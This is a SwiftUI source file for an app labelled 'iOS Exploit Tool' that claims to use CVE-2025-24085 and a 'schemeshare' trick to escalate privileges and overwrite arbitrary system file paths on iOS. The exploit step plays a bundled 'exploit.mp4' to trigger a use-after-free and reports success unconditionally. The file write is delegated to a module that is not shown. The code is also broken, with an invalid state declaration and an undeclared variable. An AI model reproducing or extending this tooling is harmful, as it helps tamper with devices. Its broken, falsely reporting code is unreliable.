// 作者：有问题联系～ pxx917144686

import SwiftUI
import AVFoundation

struct ContentView: View {
    @State private var pathInput: String = ""
    @State private var statusMessage: String = ""
    @State private var isShowingShareSheet: false

    var body: some View {
        ZStack {
            Image("background")
                .resizable()
                .scaledToFill()
                .opacity(0.65)
                .ignoresSafeArea()
            
            VStack(spacing: 20) {
                Text("iOS Exploit Tool")
                    .font(.title)
                    .fontWeight(.bold)
                    .multilineTextAlignment(.center)
                    .padding(.top, 50)
                Text("Schemeshare & CVE-2025-24085")
                    .font(.subheadline)
                    .fontWeight(.regular)
                    .multilineTextAlignment(.center)
                
                Spacer()
                
                VStack(spacing: 20) {
                    TextField("Enter file path (e.g., /var/mobile/test.plist)", text: $pathInput)
                        .textFieldStyle(RoundedBorderTextFieldStyle())
                        .padding(.horizontal, 70)
                    
                    Button(action: {
                        statusMessage = triggerExploit(path: pathInput)
                        textToShare = "Exploit result: \(statusMessage)\nPath: \(pathInput)"
                        isShowingShareSheet = true
                    }) {
                        Text("Exploit")
                            .font(.title2)
                            .fontWeight(.bold)
                            .foregroundColor(.yellow)
                    }
                    .sheet(isPresented: $isShowingShareSheet) {
                        ActivityView(activityItems: [textToShare])
                            .presentationDetents([.medium])
                    }
                    
                    Text(statusMessage)
                        .font(.caption)
                        .foregroundColor(.red)
                        .padding(.horizontal, 20)
                }
                .padding()
                
                Spacer()
            }
        }
    }
    
    func triggerExploit(path: String) -> String {
        // 触发 CVE-2025-24085 提升权限
        let privilegeEscalated = triggerCoreMediaExploit()
        if !privilegeEscalated {
            return "Failed to escalate privileges with CVE-2025-24085"
        }
        
        // 使用 schemeshare 写入目标文件
        let result = ExploitCore.writeFilePage(path)
        return result == 0 ? "Successfully modified \(path)" : "Failed to modify \(path)"
    }
    
    func triggerCoreMediaExploit() -> Bool {
        guard let mp4Path = Bundle.main.path(forResource: "exploit", ofType: "mp4") else {
            return false
        }
        let url = URL(fileURLWithPath: mp4Path)
        let player = AVPlayer(url: url)
        player.play() // 触发 use-after-free
        return true 
    }
}

struct ActivityView: UIViewControllerRepresentable {
    var activityItems: [Any]
    
    func makeUIViewController(context: Context) -> UIActivityViewController {
        let controller = UIActivityViewController(activityItems: activityItems, applicationActivities: nil)
        controller.modalPresentationStyle = .pageSheet
        return controller
    }
    
    func updateUIViewController(_ uiViewController: UIActivityViewController, context: Context) {}
}

struct ContentView_Previews: PreviewProvider {
    static var previews: some View {
        ContentView()
    }
}